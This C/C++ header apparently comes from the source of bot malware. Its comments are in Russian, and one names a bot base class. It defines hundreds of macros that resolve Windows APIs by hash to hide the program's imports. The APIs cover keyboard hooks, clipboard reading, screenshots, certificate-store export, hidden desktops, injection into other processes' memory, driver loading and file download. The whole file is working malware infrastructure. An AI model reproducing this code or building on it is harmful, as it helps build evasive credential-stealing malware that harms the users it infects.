#define pFreeSid					pushargEx< DLL_ADVAPI32, 0x5CB5EF72, 248 >
#define pControlService				pushargEx< DLL_ADVAPI32, 0x5FFEE3F1, 243 >
#define pOpenSCManagerA 			pushargEx< DLL_ADVAPI32, 0xA06E459C, 221 >
#define pCloseServiceHandle			pushargEx< DLL_ADVAPI32, 0x78CEC357, 250 >

//user32
#define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4, 251 >
#define pPeekMessageW 				pushargEx< DLL_USER32, 0xD7A87C3A, 252 >
#define pDispatchMessageW 			pushargEx< DLL_USER32, 0x4BAED1DE, 253 >
#define pMsgWaitForMultipleObjects 	pushargEx< DLL_USER32, 0xD36CEAF0, 254 >
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4, 255 >
#define pGetWindowThreadProcessId	pushargEx< DLL_USER32, 0x6C7F716F, 256 >
#define pFindWindowA				pushargEx< DLL_USER32, 0x252B53B, 257 >
#define pGetSystemMetrics			pushargEx< DLL_USER32, 0x8EBEF5B1, 258 >
#define pGetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98AC, 259 >
#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0xEA0FAD78, 260 >
#define pOpenClipboard				pushargEx< DLL_USER32, 0x6ADFC795, 261 >
#define pGetClipboardData			pushargEx< DLL_USER32, 0x8E7AE818, 262 >
#define pCloseClipboard				pushargEx< DLL_USER32, 0xF0EC2212, 263 >
#define pGetWindowTextA				pushargEx< DLL_USER32, 0x9C29100A, 264 >
#define pGetWindowTextW				pushargEx< DLL_USER32, 0x9C29101C, 265 >
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCACD450, 266 >
#define pGetWindowLongPtrA			pushargEx< DLL_USER32, 0x1D6C998B, 267 >
#define pGetWindowLongPtrW			pushargEx< DLL_USER32, 0x1D6C999D, 268 >
#define pEnumChildWindows			pushargEx< DLL_USER32, 0xAE8A5532, 269 >
#define pGetParent					pushargEx< DLL_USER32, 0x5992A5F2, 270 >
#define pGetDesktopWindow			pushargEx< DLL_USER32, 0xCD4AC62B, 271 >
#define pIsWindowVisible			pushargEx< DLL_USER32, 0xCFAAD7BF, 272 >
#define pIsWindowUnicode            pushargEx< DLL_USER32, 0x6EE99F86, 273 >
#define pSetWindowLongA				pushargEx< DLL_USER32, 0xBD6C998B, 274 >
#define pSetWindowLongW				pushargEx< DLL_USER32, 0xBD6C999D, 275 >
#define pGetWindowLongA				pushargEx< DLL_USER32, 0x1D6C998B, 276 >
#define pGetWindowLongW				pushargEx< DLL_USER32, 0x1D6C999D, 277 >
#define pSetLayeredWindowAttributes	pushargEx< DLL_USER32, 0x2DDBD2AF, 278 >
#define pSetWindowPos				pushargEx< DLL_USER32, 0xA92DF5AF, 279 >
#define pMessageBoxA				pushargEx< DLL_USER32, 0xABBC680D, 280 >
#define pMessageBoxW				pushargEx< DLL_USER32, 0xABBC681B, 281 >
#define pGetClassNameW				pushargEx< DLL_USER32, 0x484006A, 282 >
#define pGetClassNameA				pushargEx< DLL_USER32, 0x484007C, 283 >
#define pShowWindow					pushargEx< DLL_USER32, 0x7506E960, 284 >
#define pSendMessageW				pushargEx< DLL_USER32, 0x58A81C3F, 285 >
#define pSendMessageA				pushargEx< DLL_USER32, 0x58A81C29, 286 >
#define pEnumWindows				pushargEx< DLL_USER32, 0x9940B5CA, 287 >
#define pIsWindow					pushargEx< DLL_USER32, 0x9D4AF949, 288 >
#define pGetWindow					pushargEx< DLL_USER32, 0xDA12E549, 289 >
#define pCreateDesktopW				pushargEx< DLL_USER32, 0xC43ED7B1, 290 >
#define pCreateDesktopA				pushargEx< DLL_USER32, 0xC43ED7A7, 291 >
#define pGetThreadDesktop			pushargEx< DLL_USER32, 0x79F9B7FA, 292 >
#define pSwitchDesktop				pushargEx< DLL_USER32, 0x5B92DEA5, 293 >
#define pSetThreadDesktop			pushargEx< DLL_USER32, 0x79F99FFA, 294 >
#define pGetTopWindow				pushargEx< DLL_USER32, 0xC90E0C33, 295 >
#define pMoveWindow					pushargEx< DLL_USER32, 0x7234A16F, 296 >
#define pFindWindowExA				pushargEx< DLL_USER32, 0xAD4FFCD5, 297 >
#define pGetMessageA				pushargEx< DLL_USER32, 0xC8A274AC, 298 >
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0x65846C69, 299 >
#define pSendMessageTimeoutA 		pushargEx< DLL_USER32, 0x65846C7F, 300 >
#define pSetClipboardViewer			pushargEx< DLL_USER32, 0x322391FC, 301 >
#define pIsClipboardFormatAvailable	pushargEx< DLL_USER32, 0xB161BF96, 302 >
#define pChangeClipboardChain   	pushargEx< DLL_USER32, 0x7CF84417, 303 >
#define pPostMessageA				pushargEx< DLL_USER32, 0xC8A87EA7, 304 >
#define pGetMessagePos 				pushargEx< DLL_USER32, 0x9D2F45DB, 305 >
#define pClientToScreen 			pushargEx< DLL_USER32, 0x543DF505, 306 >
#define pGetWindowRect  			pushargEx< DLL_USER32, 0x97F85FA0, 307 >
#define pDefWindowProcA 			pushargEx< DLL_USER32, 0xC6CE9B8A, 308 >
#define pCallWindowProcA 			pushargEx< DLL_USER32, 0xEE5FDA87, 309 >
#define pGetKeyNameTextW 			pushargEx< DLL_USER32, 0xAD34F519, 310 >
#define pGetKeyboardState			pushargEx< DLL_USER32, 0xF5E780A6, 311 >
#define pGetKeyboardLayout			pushargEx< DLL_USER32, 0xA0C69BF7, 312 >
#define pToUnicodeEx    			pushargEx< DLL_USER32, 0x2944D0D1, 313 >
#define pLoadCursorW    			pushargEx< DLL_USER32, 0xCFB2E5CF, 314 >
#define pLoadCursorA    			pushargEx< DLL_USER32, 0xCFB2E5D9, 315 >
#define pRegisterClassA    			pushargEx< DLL_USER32, 0xAEABC9A4, 316 >
#define pCreateWindowExA   			pushargEx< DLL_USER32, 0xBF7EFB5A, 317 >
#define pTranslateMessage   		pushargEx< DLL_USER32, 0xC45D9631, 318 >
#define pDispatchMessageA   		pushargEx< DLL_USER32, 0x4BAED1C8, 319 >
#define pGetWindowDC   				pushargEx< DLL_USER32, 0xB95254C7, 320 >
#define pReleaseDC					pushargEx< DLL_USER32, 0x4CB2D16D, 321 >
#define pFillRect					pushargEx< DLL_USER32, 0xCAD4D692, 322 >
#define pCallWindowProcW			pushargEx< DLL_USER32, 0xEE5FDA91, 323 >
#define pSetTimer       			pushargEx< DLL_USER32, 0x4D9CE557, 324 >
#define pDestroyWindow      		pushargEx< DLL_USER32, 0xEB4A6DB3, 325 >
#define pGetFocus           		pushargEx< DLL_USER32, 0x6D776D57, 326 >
#define pCharLowerBuffA        		pushargEx< DLL_USER32, 0x5FDA1871, 327 >
#define pCharUpperBuffA        		pushargEx< DLL_USER32, 0xC0D4187D, 328 >
#define pwvsprintfA 				pushargEx< DLL_USER32, 0x6B3AF0EC, 329 >
#define pwvsprintfW 				pushargEx< DLL_USER32, 0x6B3AF0FA, 330 >
#define pSetWindowsHookExA 			pushargEx< DLL_USER32, 0xB4584DDA, 331 >
#define pSetWindowsHookExW 			pushargEx< DLL_USER32, 0xB4584DCC, 332 >
#define pUnhookWindowsHookEx 		pushargEx< DLL_USER32, 0xB800C8A6, 333 >
#define pSetWindowTextA 			pushargEx< DLL_USER32, 0x3C29100A, 334 >
#define pSetWindowTextW 			pushargEx< DLL_USER32, 0x3C29101C, 335 >
#define pSetWindowLongPtrA			pushargEx< DLL_USER32, 0x334A94D2, 336 >
#define pSetWindowLongPtrW			pushargEx< DLL_USER32, 0x334A94C4, 337 >
#define pScreenToClient				pushargEx< DLL_USER32, 0xBDAE901A, 338 >
#define pGetClientRect				pushargEx< DLL_USER32, 0xA2F65BA2, 339 >
#define pGetDlgItem					pushargEx< DLL_USER32, 0x9CD421A8, 340 >
#define pCallNextHookEx				pushargEx< DLL_USER32, 0x8616AB9B, 341 >
#define pGetCursor					pushargEx< DLL_USER32, 0x199725ED, 342 >
#define pSetCursor					pushargEx< DLL_USER32, 0xD9725ED, 343 >
#define pGetAncestor			 	pushargEx< DLL_USER32, 0xAAFE9D1E, 344 >
#define pRegisterWindowMessageA	 	pushargEx< DLL_USER32, 0xE5D2B59, 345 >
#define pGetDC			        	pushargEx< DLL_USER32, 0x7CBD2247, 346 >
#define pGetClassLongA	        	pushargEx< DLL_USER32, 0x2544C17C, 347 >
#define pPrintWindow	        	pushargEx< DLL_USER32, 0xF404F170, 348 >
#define pGetWindowPlacement	       	pushargEx< DLL_USER32, 0xE06982CE, 349 >
#define pIsIconic			       	pushargEx< DLL_USER32, 0x3D687AAD, 350 >
#define pSetFocus			       	pushargEx< DLL_USER32, 0x6D5F6D57, 351 >
#define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC, 352 >
#define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517, 353 >
#define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137, 354 >
#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B, 355 >
#define pDestroyMenu				pushargEx< DLL_USER32, 0x6A50AD38, 356 >
#define pmouse_event				pushargEx< DLL_USER32, 0xAB3EFAFD, 357 >
#define pSetCapture					pushargEx< DLL_USER32, 0xEB747643, 358 >
#define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18, 359 >
#define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 360 >
#define pSendInput					pushargEx< DLL_USER32, 0xce1781d0, 361 >

//winsock
#define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 362 >
#define pWSAStartup 				pushargEx< DLL_WINSOCK, 0xCDDE757D, 363 >
#define psocket 					pushargEx< DLL_WINSOCK, 0xFC7AF16A, 364 >
#define pclosesocket 				pushargEx< DLL_WINSOCK, 0x939D7D9C, 365 >
#define paccept 					pushargEx< DLL_WINSOCK, 0x3C797B7A, 366 >
#define pbind 						pushargEx< DLL_WINSOCK, 0xC5A7764, 367 >
#define phtons 						pushargEx< DLL_WINSOCK, 0x8E9BF775, 368 >
#define plisten 					pushargEx< DLL_WINSOCK, 0x9E7D3188, 369 >
#define precv 						pushargEx< DLL_WINSOCK, 0xE5971F6, 370 >
#define psend 						pushargEx< DLL_WINSOCK, 0xE797764, 371 >
#define pconnect 					pushargEx< DLL_WINSOCK, 0xEDD8FE8A, 372 >
#define pshutdown 					pushargEx< DLL_WINSOCK, 0x4C7C5841, 373 >
#define pgethostbyname 				pushargEx< DLL_WINSOCK, 0xF44318C6, 374 >
#define pgethostbyaddr 				pushargEx< DLL_WINSOCK, 0xF5A25C51, 375 >
#define pinet_addr 					pushargEx< DLL_WINSOCK, 0x95E4A5D7, 376 >
#define pinet_ntoa 					pushargEx< DLL_WINSOCK, 0x9400A044, 377 >
#define pgetaddrinfo				pushargEx< DLL_WINSOCK, 0xD9F839BA, 378 >
#define pgetpeername				pushargEx< DLL_WINSOCK, 0xD939F838, 379 >
#define pselect						pushargEx< DLL_WINSOCK, 0x5D99726A, 380 >
#define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733, 381 >
#define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072, 382 >
#define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072, 383 >
#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D, 384 >
#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B, 385 >

//ntdll
#define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73, 386 >
#define pRtlInitAnsiString			pushargEx< DLL_NTDLL, 0xEE02056A, 387 >
#define pNtOpenFile 				pushargEx< DLL_NTDLL, 0x9C45B56C, 388 >
#define pNtOpenDirectoryObject 		pushargEx< DLL_NTDLL, 0xF5F11CF0, 389 >
#define pNtCreateSection 			pushargEx< DLL_NTDLL, 0x6E6F608B, 390 >
#define pNtOpenSection 				pushargEx< DLL_NTDLL, 0x5FA9AB38, 391 >
#define pZwLoadDriver 				pushargEx< DLL_NTDLL, 0x42F57D33, 392 >
#define pZwUnloadDriver 			pushargEx< DLL_NTDLL, 0x95849B61, 393 >
#define pRtlAdjustPrivilege 		pushargEx< DLL_NTDLL, 0xC2A6B1AE, 394 >
#define pZwMakeTemporaryObject 		pushargEx< DLL_NTDLL, 0x128CE9D3, 395 >
#define pNtClose 					pushargEx< DLL_NTDLL, 0x3D9AC241, 396 >
#define pRtlImageNtHeader			pushargEx< DLL_NTDLL, 0xDD39FD14, 397 >
#define pZwQuerySystemInformation	pushargEx< DLL_NTDLL, 0xBC44A131, 398 >
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x9ED4D161, 399 >
#define pZwMapViewOfSection			pushargEx< DLL_NTDLL, 0x594D9A3C, 400 >
#define pZwQueueApcThread			pushargEx< DLL_NTDLL, 0xC0E4F6EE, 401 >
#define pZwResumeThread				pushargEx< DLL_NTDLL, 0xACF8BF39, 402 >
#define pZwTestAlert				pushargEx< DLL_NTDLL, 0xC952A06B, 403 >
#define pZwQueryInformationThread	pushargEx< DLL_NTDLL, 0xFAEDF3AA, 404 >
#define pZwOpenProcess				pushargEx< DLL_NTDLL, 0x9C0AC99D, 405 >
#define pZwOpenProcessToken			pushargEx< DLL_NTDLL, 0xADACBE07, 406 >
#define pZwClose					pushargEx< DLL_NTDLL, 0x3D9A9259, 407 >
#define pZwAllocateVirtualMemory	pushargEx< DLL_NTDLL, 0x594AA9E4, 408 >
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0xBED3922C, 409 >
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0xEEE7AF23, 410 >
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0x3836C63E, 411 >
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0xE9E0A4F7, 412 >
#define pLdrLoadDll					pushargEx< DLL_NTDLL, 0x78740534, 413 >
#define pLdrGetDllHandle			pushargEx< DLL_NTDLL, 0x7E287C6A, 414 >
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0x323C2875, 415 >
#define pZwSetContextThread			pushargEx< DLL_NTDLL, 0x62E2FE6F, 416 >
#define pZwSetInformationProcess	pushargEx< DLL_NTDLL, 0xCA2BF652, 417 >
#define pZwQueryInformationProcess	pushargEx< DLL_NTDLL, 0xA638CE5F, 418 >
#define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28, 419 >
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7, 420 >
#define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E, 421 >
#define pRtlComputeCrc32			pushargEx< DLL_NTDLL,0x687B7023, 422 >



//winsta
#define pWinStationTerminateProcess	pushargEx< DLL_WINSTA, 0xA60C5F05, 423 >

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx< DLL_SHELL32, 0xC95D8550, 424 >
#define pSHGetSpecialFolderPathW 	pushargEx< DLL_SHELL32, 0xC95D8546, 425 >
#define pFindExecutableA			pushargEx< DLL_SHELL32, 0x37707500, 426 >
#define pFindExecutableW			pushargEx< DLL_SHELL32, 0x37707516, 427 >
#define pSHGetFolderPathA			pushargEx< DLL_SHELL32, 0xDEAA9541, 428 >
#define pSHGetFolderPathW			pushargEx< DLL_SHELL32, 0xDEAA9557, 429 >
#define pShellExecuteW				pushargEx< DLL_SHELL32, 0x570BC88F, 430 >
#define pShellExecuteA				pushargEx< DLL_SHELL32, 0x570BC899, 431 >
#define pStrStrIW 					pushargEx< DLL_SHELL32, 0x3E3B7742, 432 > //	PTSTR StrStrI(PTSTR pszFirst,PCTSTR pszSrch);
#define pStrStrIA 					pushargEx< DLL_SHELL32, 0x3E3B7754, 433 >
#define pShellExecuteExA			pushargEx< DLL_SHELL32, 0xf2276983, 434 >
#define pShellExecuteExW			pushargEx< DLL_SHELL32, 0xf2276995, 435 >
#define pSHFileOperationA			pushargEx< DLL_SHELL32, 0x8B6D020B, 436 >
#define pSHFileOperationW			pushargEx< DLL_SHELL32, 0x8B6D021D, 437 >



//wininet
#define pInternetConnectA 			pushargEx< DLL_WININET, 0xBE618D3E, 438 >
#define pInternetConnectW 			pushargEx< DLL_WININET, 0xBE618D28, 439 >
#define pHttpOpenRequestA 			pushargEx< DLL_WININET, 0x1510002F, 440 >
#define pHttpOpenRequestW 			pushargEx< DLL_WININET, 0x15100039, 441 >
#define pHttpSendRequestA 			pushargEx< DLL_WININET, 0x9F13856A, 442 >
#define pHttpSendRequestW 			pushargEx< DLL_WININET, 0x9F13857C, 443 >
#define pInternetCloseHandle 		pushargEx< DLL_WININET, 0x7314FB0C, 444 >
#define pInternetQueryOptionA 		pushargEx< DLL_WININET, 0x2AE71934, 445 >
#define pInternetQueryOptionW 		pushargEx< DLL_WININET, 0x2AE71922, 446 >
#define pInternetSetOptionA 		pushargEx< DLL_WININET, 0x1AD09C78, 447 >
#define pInternetSetStatusCallback 	pushargEx< DLL_WININET, 0x9EF6461, 448 >
#define pHttpQueryInfoA 			pushargEx< DLL_WININET, 0x2F5CE027, 449 >
#define pHttpQueryInfoW 			pushargEx< DLL_WININET, 0x2F5CE031, 450 >
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0xB5901061, 451 >
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0xB5901077, 452 >
#define pGetUrlCacheEntryInfoW 		pushargEx< DLL_WININET, 0x57FBC0CB, 453 >
#define pGetUrlCacheEntryInfoA 		pushargEx< DLL_WININET, 0x57FBC0DD, 454 >
#define pFindFirstUrlCacheEntryA	pushargEx< DLL_WININET, 0xDDCB15D, 455 >
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x8733D614, 456 >
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0xA3A80AB6, 457 >
#define pFindCloseUrlCache			pushargEx< DLL_WININET, 0xFDE87743, 458 >
#define pInternetOpenA				pushargEx< DLL_WININET, 0x8593DD7, 459 >
#define pInternetOpenUrlA			pushargEx< DLL_WININET, 0xB87DBD66, 460 >
#define pInternetReadFile			pushargEx< DLL_WININET, 0x1A212962, 461 >
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0x2C523864, 462 >
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0x2C523872, 463 >
#define pReadUrlCacheEntryStream	pushargEx< DLL_WININET, 0x1672BC16, 464 >
#define pUnlockUrlCacheEntryStream	pushargEx< DLL_WININET, 0xEE22C82A, 465 >
#define pRetrieveUrlCacheEntryStreamA	pushargEx< DLL_WININET, 0x609C6936, 466 >
#define pFindFirstUrlCacheEntryExA  pushargEx< DLL_WININET, 0x2C567F36, 467 >
#define pFindNextUrlCacheEntryExA	pushargEx< DLL_WININET, 0xF5841D8D, 468 >
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0xD4055B10, 469 >
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0x10815BF5, 470 >
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x548D61B6, 471 >


//urlmon
#define pURLDownloadToFileA			pushargEx< DLL_URLMON, 0xD95D2399, 472 >
#define pURLDownloadToFileW			pushargEx< DLL_URLMON, 0xD95D238F, 473 >
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0x534D481, 474 >


/* gdi32.dll */
#define pCreateCompatibleBitmap		  pushargEx< DLL_GDI, 0x6B3470D5, 475 >
#define pCreateCompatibleDC		      pushargEx< DLL_GDI, 0x5AF0017C, 476 >
#define pSelectObject       	      pushargEx< DLL_GDI, 0x4894DAFC, 477 >
#define pBitBlt             	      pushargEx< DLL_GDI, 0x9E90B462, 478 >
#define pDeleteDC            	      pushargEx< DLL_GDI, 0x5E10F525, 479 >
#define pDeleteObject           	  pushargEx< DLL_GDI, 0x48B87EFC, 480 >
#define pGetDeviceCaps           	  pushargEx< DLL_GDI, 0x39E9624F, 481 >
#define pCreateSolidBrush             pushargEx< DLL_GDI, 0xEF9AC06E, 482 >


/* gdiplus.dll */
#define pGdiplusStartup		          pushargEx< DLL_GDIPLUS, 0x55F74962, 483 >
#define pGdipCreateBitmapFromHBITMAP  pushargEx< DLL_GDIPLUS, 0xB7F0B572, 484 >
#define pGdipSaveImageToFile		  pushargEx< DLL_GDIPLUS, 0xE410B3EB, 485 >
#define pGdipDisposeImage	          pushargEx< DLL_GDIPLUS, 0x226FA923, 486 >
#define pGdiplusShutdown		      pushargEx< DLL_GDIPLUS, 0x99A24264, 487 >


//crypt32
#define pCertOpenSystemStoreA				pushargEx< DLL_CRYPT32, 0xEEA9ED9D, 488 >
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0x9897E094, 489 >
#define pPFXExportCertStoreEx				pushargEx< DLL_CRYPT32, 0xDFDB467E, 490 >
#define pCertCloseStore						pushargEx< DLL_CRYPT32, 0xCC1A6B6B, 491 >
#define pPFXImportCertStore					pushargEx< DLL_CRYPT32, 0x3A1B7F5D, 492 >
#define pCertAddCertificateContextToStore	pushargEx< DLL_CRYPT32, 0xDC6DD6E5, 493 >
#define pCertDuplicateCertificateContext	pushargEx< DLL_CRYPT32, 0x2F16F47, 494 >
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x5B08B5F, 495 >



//
//psapi.dll
#define	pGetMappedFileNameA			pushargEx< DLL_PSAPI, 0x860331a8, 496 >
#define pEnumProcessModules			pushargEx< DLL_PSAPI, 0x189F16C9, 497 >
#define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8, 498 >
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191, 499 >
#define pGetProcessImageFileNameA	pushargEx<DLL_PSAPI, 0x2741105, 500 >


//
//shlwapi.dll
#define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c, 501 >
#define pPathFindFileNameW			pushargEx< DLL_SHLWAPI, 0xEED5399A, 502 >
#define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5, 503 >
#define pPathCombineW				pushargEx< DLL_SHLWAPI, 0x45b615c3, 504 >
#define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6, 505 >
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01, 506 >
#define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7, 507 >
#define pStrToInt64ExA				pushargEx< DLL_SHLWAPI, 0xC3C5B48, 508 >
#define pPathAppendA				pushargEx< DLL_SHLWAPI, 0xF86AA1F6, 509 >
#define pPathAppendW				pushargEx< DLL_SHLWAPI, 0xF86AA1E0, 510 >
#define pPathIsDirectoryEmptyA		pushargEx< DLL_SHLWAPI, 0xCA98893B, 511 >


//Iphlpapi.dll
#define	pGetIpNetTable				pushargEx< DLL_IPHLPAPI, 0xB8D99CE4, 512 >
#define	pGetAdaptersInfo			pushargEx< DLL_IPHLPAPI, 0xE69A1CD7, 513 >



//odbc32
#define pSQLAllocHandle				pushargEx< DLL_ODBC32, 0xEC1F2857, 514 >
#define pSQLSetEnvAttr				pushargEx< DLL_ODBC32, 0x88EE1E2C, 515 >
#define pSQLConnectA				pushargEx< DLL_ODBC32, 0x203F51DF, 516 >
#define pSQLDriverConnectA			pushargEx< DLL_ODBC32, 0x3941DBB7, 517 >
#define pSQLPrepareA				pushargEx< DLL_ODBC32, 0xC09D6D06, 518 >
#define pSQLBindCol					pushargEx< DLL_ODBC32, 0x3D09FC8B, 519 >
#define pSQLExecute					pushargEx< DLL_ODBC32, 0x8DE46D8A, 520 >
#define pSQLFetch					pushargEx< DLL_ODBC32, 0x6C1A778C, 521 >
#define pSQLCloseCursor				pushargEx< DLL_ODBC32, 0xACA2F119, 522 >
#define pSQLFreeHandle				pushargEx< DLL_ODBC32, 0x6A289300, 523 >
#define pSQLDisconnect				pushargEx< DLL_ODBC32, 0x8104CDA8, 524 >
#define pSQLBindParameter			pushargEx< DLL_ODBC32, 0xE8536508, 525 >
#define pSQLGetDiagRecA				pushargEx< DLL_ODBC32, 0x13C9473F, 526 >

//version.dll
#define pGetFileVersionInfoSizeA	pushargEx< DLL_VERSION, 0x8A94F707, 527 >
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0x7AA45C7A, 528 >
#define pVerQueryValueA				pushargEx< DLL_VERSION, 0x4E26C00F, 529 >

// ole32.dll
#define pCoCreateGuid				pushargEx< DLL_OLE32, 0xAA3E88A3, 530 >
#define pCoInitializeEx				pushargEx<DLL_OLE32, 0x7573DE28, 531 >
#define pCoUninitialize				pushargEx<DLL_OLE32, 0xEDB3159D, 532 >
#define pCoCreateInstance			pushargEx<DLL_OLE32, 0x368435BE, 533 >
#define pCoInitializeSecurity		pushargEx<DLL_OLE32, 0x910EACB3, 534 >

//winspool.drv
#define pAddPrintProvidorA			pushargEx<DLL_WINSPOOL, 0x4B12B4DF, 535 >
#define pDeletePrintProvidorA		pushargEx<DLL_WINSPOOL, 0x3D369C42, 536 >

//imagehlp
#define pCheckSumMappedFile			pushargEx<DLL_IMAGEHLP, 0xd5edc5a2, 537 >

//****************************************************************
//  Вспомогательные функции
//****************************************************************

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))


//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************


class TBotObject
{
public:
	virtual ~TBotObject() {}

	void* operator new(size_t size);
	void* operator new[](size_t size);
	void  operator delete(void* Pointer);
	void  operator delete[](void* Pointer);
};


//----------------------------------------------------------------------------
#endif
